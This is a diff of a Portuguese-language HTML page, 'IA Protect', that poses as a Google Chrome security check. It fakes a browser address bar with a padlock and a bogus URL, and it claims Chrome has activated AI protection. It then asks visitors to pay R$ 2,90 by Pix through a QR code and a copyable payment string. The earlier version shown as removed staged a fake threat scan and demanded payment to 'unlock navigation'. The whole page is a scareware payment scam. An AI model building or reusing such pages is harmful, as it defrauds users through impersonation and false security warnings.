@@ -1,100 +1,166 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>IA Protect - Verificação</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>IA Protect - Verificação de Segurança</title>
   <style>
     body {
+      background-color: #0a0a0a;
+      color: #f1f1f1;
+      font-family: 'Segoe UI', sans-serif;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: #0e0e0e;
-      color: #fff;
-      text-align: center;
+      padding: 0;
+    }
+
+    /* Barra superior tipo navegador */
+    .fake-bar {
+      background-color: #2b2b2b;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      padding: 0 14px;
+      color: #ccc;
+      font-size: 14px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+
+    .lock {
+      color: #4caf50;
+      margin-right: 8px;
+    }
+
+    .url {
+      color: #e0e0e0;
+    }
+
+    /* Escudo IA Protect */
+    .shield-container {
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
+      margin: 40px 0 20px;
+      animation: pulse 2s infinite;
     }
 
-    .scanner {
-      animation: pulse 1.5s infinite;
-      border: 4px solid #00ff99;
-      border-radius: 50%;
-      width: 80px;
-      height: 80px;
-      margin-bottom: 20px;
+    .shield-icon {
+      font-size: 52px;
+      color: #00ffc8;
+      text-shadow: 0 0 8px rgba(0,255,200,0.7);
+    }
+
+    .shield-text {
+      color: #d0f7f0;
+      font-size: 15px;
+      margin-top: 6px;
+      letter-spacing: 0.5px;
     }
 
     @keyframes pulse {
-      0% {
-        transform: scale(1);
-        opacity: 0.8;
-      }
-      50% {
-        transform: scale(1.2);
-        opacity: 1;
-      }
-      100% {
-        transform: scale(1);
-        opacity: 0.8;
-      }
+      0% { transform: scale(1); opacity: 0.85; }
+      50% { transform: scale(1.08); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.85; }
     }
 
-    .loading, .main-content {
-      display: none;
+    .container {
+      text-align: center;
+      padding: 0 24px;
     }
 
-    .main-content img {
-      width: 200px;
+    h1 {
+      font-size: 22px;
+      margin-bottom: 12px;
+      color: #ffef9f;
+    }
+
+    p {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 18px;
+    }
+
+    .price-box {
+      background-color: #111;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 20px auto;
+      display: inline-block;
+      font-size: 15px;
+      color: #00ffc8;
+      font-weight: bold;
+    }
+
+    .qr-code {
       margin: 20px 0;
     }
 
-    button {
-      background: #00ff99;
-      color: #000;
+    .pix-code {
+      background: #1c1c1c;
+      padding: 12px;
+      border-radius: 6px;
+      word-break: break-all;
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 10px;
+    }
+
+    .copy-btn {
+      background-color: #00ffc8;
       border: none;
+      color: #000;
       padding: 10px 20px;
-      border-radius: 8px;
-      font-weight: bold;
+      font-size: 14px;
+      border-radius: 5px;
       cursor: pointer;
     }
+
+    .copy-btn:hover {
+      background-color: #00ddb0;
+    }
+
   </style>
 </head>
 <body>
-  <div class="loading" id="loading">
-    <div class="scanner"></div>
-    <h2>Varredura em andamento...</h2>
-    <p>IA Protect está analisando esta conexão.</p>
+
+  <div class="fake-bar">
+    <span class="lock">🔒</span>
+    <span class="url">https://secureconnection-check.com/IA-Protect</span>
   </div>
 
-  <div class="main-content" id="main">
-    <h1>O Google Chrome detectou uma possível ameaça invisível nesta página</h1>
-    <p>Para garantir sua segurança, o sistema <strong>IA Protect</strong> ativou uma camada de proteção imediata.</p>
-    <p><strong>⚠️ Confirme sua identidade via Pix (R$ 2,90) para desbloquear a navegação.</strong></p>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/QR_Code_Example.svg" alt="QR Pix"/>
-    <p><strong>Código Pix:</strong></p>
-    <p id="pix-code">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey52040000530398654039.905802BR5921IA Protect Segurança6014São Paulo-SP62070503***6304ABCD</p>
-    <button onclick="copyPix()">Copiar código Pix</button>
+  <div class="shield-container">
+    <div class="shield-icon">🛡️</div>
+    <div class="shield-text">IA Protect: Segurança Ativa</div>
+  </div>
+
+  <div class="container">
+    <h1>Verificação de Segurança em andamento...</h1>
+    <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo de proteção IA Protect®.</p>
+    <p>Essa tecnologia baseada em inteligência artificial previne o comprometimento de dados durante sua navegação.</p>
+
+    <div class="price-box">
+      IA Protect operates under $0.55 USD<br>
+      Valor único em Real: R$ 2,90
+    </div>
+
+    <div class="qr-code">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?data=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey...&size=180x180" alt="QR Code Pix">
+    </div>
+
+    <div class="pix-code" id="pixCode">
+      00020126360014BR.GOV.BCB.PIX0111qrfakepixkey...
+    </div>
+
+    <button class="copy-btn" onclick="copyPixCode()">Copiar código Pix</button>
   </div>
 
   <script>
-    // Aguarda 4 segundos simulando varredura
-    setTimeout(() => {
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("main").style.display = "block";
-    }, 4000);
-
-    function copyPix() {
-      const text = document.getElementById("pix-code").innerText;
+    function copyPixCode() {
+      const text = document.getElementById("pixCode").innerText;
       navigator.clipboard.writeText(text).then(() => {
-        alert("Código Pix copiado!");
+        alert("Código Pix copiado com sucesso.");
       });
     }
-
-    // Mostrar loading ao iniciar
-    document.getElementById("loading").style.display = "block";
   </script>
+
 </body>
 </html>
